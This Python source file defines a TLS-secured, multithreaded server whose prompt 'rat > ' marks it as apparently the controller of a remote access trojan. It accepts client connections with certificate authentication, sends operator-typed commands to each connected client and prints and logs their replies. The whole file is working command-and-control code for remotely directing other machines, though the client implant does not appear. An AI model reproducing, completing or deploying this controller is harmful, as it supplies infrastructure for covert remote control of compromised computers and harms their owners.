# écouter sur un port
# accepter connexions
# lancer threads
import socket
import ssl
from threading import Thread
from utils.logger import setup_logger

logger = setup_logger()


class SSLServer:
    def __init__(
        self, host, port, server_cert, server_key, client_cert, chunk_size=1024
    ):
        self.host = host
        self.port = port
        self.chunk_size = chunk_size
        self._context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        self._context.verify_mode = ssl.CERT_REQUIRED
        self._context.load_cert_chain(server_cert, server_key)
        self._context.load_verify_locations(client_cert)

    def connect(self):

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:

            sock.bind((self.host, self.port))

            sock.listen(5)

            print("Server listening")
            logger.info("Server listening")
            while True:

                conn, addr = sock.accept()

                try:

                    sconn = self._context.wrap_socket(
                        conn,
                        server_side=True,
                    )

                    print("Client connected:", addr[0])
                    logger.info("Client connected: %s", addr[0])

                    Thread(
                        target=self._handle_client,
                        args=(sconn,),
                        daemon=True,
                    ).start()

                except ssl.SSLError:

                    print("SSL handshake failed")
                    logger.error("SSL handshake failed")

    def _recv(self, sock):

        try:

            while True:

                data = sock.recv(self.chunk_size)

                if not data:
                    print("Client disconnected")
                    logger.warning("Client disconnected")
                    break

                print(data.decode())

        except ConnectionResetError:

            print("Client forcibly closed connection")
            logger.warning("Client forcibly closed connection")

        except ssl.SSLError:

            print("SSL error")
            logger.error("SSL error")
        except Exception as e:

            print(f"Error: {e}")

        finally:

            sock.close()

    def _handle_client(self, sock):

        logger.info("Client handler started")

        try:

            while True:

                command = input("rat > ")

                if not command:
                    continue

                sock.sendall(command.encode())

                logger.info("Server sent command: %s", command)

                data = sock.recv(self.chunk_size)

                if not data:
                    logger.warning("Client disconnected")

                    break

                response = data.decode(errors="ignore")

                print(response)

                logger.info("Client responded: %s", response)

        except Exception as e:

            logger.error("Client handler error: %s", e)

        finally:

            logger.info("Closing client socket")

            sock.close()


class SSLServerThread(Thread):
    def __init__(self, server):
        super().__init__()
        self._server = server
        self.daemon = True

    def run(self):
        self._server.connect()
